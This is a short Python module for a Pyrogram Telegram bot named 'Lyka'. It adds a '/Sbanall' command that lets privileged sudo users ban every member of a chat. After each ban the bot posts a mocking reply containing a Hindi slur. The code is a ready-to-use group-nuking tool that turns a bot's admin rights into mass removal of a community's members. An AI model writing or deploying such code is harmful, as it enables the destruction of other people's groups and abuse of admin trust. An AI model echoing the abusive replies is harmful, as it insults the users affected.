from Lyka import app
from config import OWNER_ID
from pyrogram import filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from Lyka.utils.Lyka_ban import admin_filter
from Lyka.misc import SUDOERS

BOT_ID = app.me.id  # Corrected this line


@app.on_message(filters.command("/Sbanall") & SUDOERS)
async def ban_all(_, msg):
    chat_id = msg.chat.id
    bot = await app.get_chat_member(chat_id, BOT_ID)
    bot_permission = bot.privileges.can_restrict_members == True
    if bot_permission:
        async for member in app.get_chat_members(chat_id):
            try:
                await app.ban_chat_member(chat_id, member.user.id)
                await msg.reply_text(
                    f"**‣ Ek or mar gya mc 🥺 .**\n\n➻ {member.user.mention}"
                )
            except Exception:
                pass
    else:
        await msg.reply_text(
            "Either i don't have the right to restrict users or you are not in sudo users \n Owner ko papa bol ke sudo lele || @Nitriic ||"
        )
